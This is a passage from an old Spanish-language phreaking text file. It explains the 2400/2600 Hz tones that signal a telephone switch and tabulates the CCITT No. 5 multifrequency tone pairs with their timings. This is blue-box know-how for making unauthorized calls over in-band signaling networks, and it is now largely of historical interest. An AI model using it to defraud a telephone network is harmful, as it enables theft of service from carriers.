  ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Country Code, C¢digo de pa¡s
  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ KEY PULSE - Indica que comienza un n£mero telef.


 Bueno, por ahora pasemos a los tonos que se enviarian para indicarle al SWITCH
 que hemos cortado.

 Estos tonos estan compuestos generalmente por una o mas frecuencias simulta-
 neas, veamos el siguiente ejemplo:

        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Primer tono
        ³         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Wait (espera) en Milisegundos
        ³         ³          ÚÄÄÄÄÄÄÄÄÄÄÄÄ Segundo tono
        ³         ³          ³          ÚÄ Wait (espera) en Milisegundos
 ÚÄÄÄÄÄÄÁÄÄÄÄÄÄ¿ ÚÁÄ¿ ÚÄÄÄÄÄÄÁÄÄÄÄÄ¿   ÚÁ¿
  2400-2600-130 - 20 - 2400-2600-100 - 200
  ÀÂÄÙ ÀÂÄÙ ÀÂÙ        ÀÄÂÙ ÀÄÂÙ ÀÄÁÄÄÄÄÄÄ Delay, Repetici¢n del tono
   ³    ³    ³           ³    ÀÄÄÄÄÄÄÄÄÄÄÄ Segunda Frecuencia en Hertz
   ³    ³    ³           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Primera Frecuencia en Hertz
   ³    ³    ³
   ³    ³    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Delay, Repetici¢n del tono
   ³    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Segunda Frecuencia en Hertz
   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Primera frecuencia en Hertz

 El DELAY es el tiempo en que se va a repetir esa se¤al (en Milisegundos).
 El WAIT es el es el tiempo que se debe esperar sin se¤al antes de la otra
 se¤al (en Milisegundos).

 Estos son algunos de los comandos de la norma CCITT #5, las frecuencias para
 los mismos son:
 
   ÚÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÂÄÄÄ¿
   ³ CMD ³ Frec. 1 ³ Frec. 2 ³Del³Wat³
   ÃÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÅÄÄÄ´
   ³  1  ³  700 Hz ³  900 Hz ³ 60³ 30³
   ³  2  ³  700 Hz ³ 1100 Hz ³ 60³ 30³
   ³  3  ³  900 Hz ³ 1100 Hz ³ 60³ 30³
   ³  4  ³  700 Hz ³ 1300 Hz ³ 60³ 30³
   ³  5  ³  900 Hz ³ 1300 Hz ³ 60³ 30³
   ³  6  ³ 1100 Hz ³ 1300 Hz ³ 60³ 30³
   ³  7  ³  700 Hz ³ 1500 Hz ³ 60³ 30³
   ³  8  ³  900 Hz ³ 1500 Hz ³ 60³ 30³
   ³  9  ³ 1100 Hz ³ 1500 Hz ³ 60³ 30³
   ³  0  ³ 1300 Hz ³ 1500 Hz ³ 60³ 30³
   ³  *  ³  700 Hz ³ 1700 Hz ³120³ 50³
   ³  #  ³  900 Hz ³ 1700 Hz ³120³ 50³
   ÃÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÅÄÄÄ´
   ³ KP1 ³ 1100 Hz ³ 1700 Hz ³120³ 50³
   ³ ST  ³ 1500 Hz ³ 1700 Hz ³120³ 50³
   ³ C11 ³  700 Hz ³ 1700 Hz ³120³ 50³
   ³ C12 ³  900 Hz ³ 1700 Hz ³120³ 50³
   ³ KP2 ³ 1300 Hz ³ 1700 Hz ³120³ 50³
   ÀÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÁÄÄÄÙ

 Bueno por ahora creemos que esto es suficiente, como para empezar a conocer
 algo de Phreaking. Mas adelante explicaremos otras cosas.

                                            Dr.Retro & Mortal
